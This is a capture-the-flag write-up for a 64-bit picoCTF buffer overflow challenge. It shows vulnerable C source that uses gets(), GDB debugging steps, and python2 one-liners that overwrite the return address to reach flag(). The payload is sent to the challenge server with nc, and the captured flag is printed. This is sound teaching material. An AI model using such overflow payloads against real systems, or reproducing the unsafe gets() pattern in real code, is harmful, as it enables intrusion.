**Description**

Author: Sanjay C / LT 'syreal' Jones

Overflow x64 code Most problems before this are 32-bit x86. Now we'll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to the flag function in this program. Download source. nc saturn.picoctf.net 49994

Hints
1) Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes.
2) Jump to the second instruction (the one after the first push) in the flag function, if you're getting mysterious segmentation faults.

**Tools**

This writeup is a continuation of the challenges [bufferoverflow0](./bufferoverflow0(100).md) and [bufferoverflow1](./bufferoverflow1(200).md) you may want to see these to gain insights into how a basic buffer overflow attack works. Reading the [bufferoverflow2](./bufferoverflow2(300).md) writeup may be helpful as well, though shouldn't be necessary for this writeup as it deals with function arguments which aren't relevant to this challenge.

In this writeup and subsequent binary exploitation writeups, I will be using the tools [Ghidra](https://github.com/NationalSecurityAgency/ghidra), [GDB](https://en.wikipedia.org/wiki/GNU_Debugger), and an extension for GDB called [pwndbg](https://github.com/pwndbg/pwndbg).
This tools together provide excellent static and dynamic analysis of a binary. 
Another tool to look at is radare2, however I did not use it for this writeup.
This competition is an excellent place to learn how to use these programs, however I will not be teaching them in entirety.

**Recon**

This program is compiled to be 64bits, or 8 bytes. This means that hex addresses will be 8 long instead of 4 long like in previous problems.

Lets look at the program source

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
```

It looks like we need to overflow from the vuln() function to the flag() function to get our flag

**Exploit**

As always with downloading a binary to run, use ```chmod +x vuln``` to mark it as executable.

```layout asm```

lets set a breakpoint right after the gets call in vuln to see what is happening to memory when we exploit the program

```break *(vuln+29)```

Our buffer is 64 characters long, so lets overflow a bit more than that

```r <<< $(python2 -c 'print("a"*64 + "b"*8 + "c"*8)')```

This will try to return to the value stored at RSP, which happens to be what we overwrote with 8 c's

Now, lets try and get to the flag function

```
pwndbg> p *(flag)
$1 = {<text variable, no debug info>} 0x401236 <flag>
```

Now, to buld our exploit

```r <<< $(python2 -c 'print("a"*64 + "b"*8 + "\x36\x12\x40")')```

We only need these 3 hex values, as the position of the flag funciton is only that long. We could add the rest of the null characters at the start of the value in memory to make up the full 8 bytes but those are already there in memory so that is unecessary.

It jumps to our flag function, however we get a weird segfault. This is what the hint of the problem warned us about. Apparently we need to jump to the second instruciton of the flag function

This value is at ```flag+4``` or ```0x40123a```

```r <<< $(python2 -c 'print("a"*64 + "b"*8 + "\x3a\x12\x40")')```

That didn't work either! Lets try one address further (the 3rd instruction of the function) ```flag+5``` or ```0x40123b```

```r <<< $(python2 -c 'print("a"*64 + "b"*8 + "\x3b\x12\x40")')```

This one works and we get our test flag!

Lets try it outside of gdb

```python2 -c 'print("a"*64 + "b"*8 + "\x3b\x12\x40")' | ./vuln```

That works as well, finally lets move on to the server

```python2 -c 'print("a"*64 + "b"*8 + "\x3b\x12\x40")' | nc saturn.picoctf.net 53341```

We get our flag!
It was ```picoCTF{b1663r_15_b3773r_a0428cd7}```
